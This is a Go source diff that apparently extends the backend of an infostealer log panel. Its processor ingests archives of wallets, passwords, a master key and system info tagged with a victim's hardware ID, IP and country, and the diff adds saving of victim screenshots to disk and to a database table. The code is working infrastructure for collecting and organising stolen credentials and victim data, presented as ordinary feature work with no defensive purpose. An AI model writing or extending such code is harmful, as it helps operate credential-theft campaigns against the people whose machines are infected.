@@ -6,6 +6,7 @@ import (
 	"database/sql"
 	"encoding/json"
 	"errors"
+	"os"
 	"path/filepath"
 	"strings"
 
@@ -196,6 +197,8 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 	var files []fileEntry
 	var systemInfoContent string
 	var masterKey []byte
+	var screenshotBytes []byte
+	var screenshotW, screenshotH int
 
 	for _, f := range zr.File {
 		if !isValidPath(f.Name) {
@@ -298,11 +301,17 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 				Name: walletName,
 				Path: f.Name,
 			})
-
-		case strings.EqualFold(name, "system_info.txt"):
-			buf := new(bytes.Buffer)
-			buf.ReadFrom(rc)
-			systemInfoContent = buf.String()
+	case strings.EqualFold(name, "screenshot.bmp") && filepath.Dir(f.Name) == ".":
+		buf := new(bytes.Buffer)
+		buf.ReadFrom(rc)
+		data := buf.Bytes()
+		w, h, _, _ := parseBMPHeader(data)
+		screenshotBytes = data
+		screenshotW, screenshotH = w, h
+	case strings.EqualFold(name, "system_info.txt"):
+		buf := new(bytes.Buffer)
+		buf.ReadFrom(rc)
+		systemInfoContent = buf.String()
 
 		default:
 			buf := new(bytes.Buffer)
@@ -328,6 +337,31 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 		sessionID, meta["hwid"], meta["os"], meta["username"], meta["ip"], meta["country"], ownerID)
 	if err != nil {
 		return "", err
+	}
+
+	if len(screenshotBytes) > 0 {
+		id := uuid.New().String()
+		dir := filepath.Join("data", "screenshots")
+		if err := os.MkdirAll(dir, 0o755); err != nil {
+			return "", err
+		}
+		path := filepath.Join(dir, sessionID+".bmp")
+		if err := os.WriteFile(path, screenshotBytes, 0o644); err != nil {
+			return "", err
+		}
+		if _, err := tx.Exec(
+			`INSERT INTO screenshots (id, session_id, file_path, mime_type, size_bytes, width, height)
+			 VALUES (?, ?, ?, 'image/bmp', ?, ?, ?)
+			 ON CONFLICT(session_id) DO UPDATE SET
+			   file_path=excluded.file_path,
+			   size_bytes=excluded.size_bytes,
+			   width=excluded.width,
+			   height=excluded.height,
+			   created_at=CURRENT_TIMESTAMP`,
+			id, sessionID, path, len(screenshotBytes), screenshotW, screenshotH,
+		); err != nil {
+			return "", err
+		}
 	}
 
 	if len(passwords) > 0 {
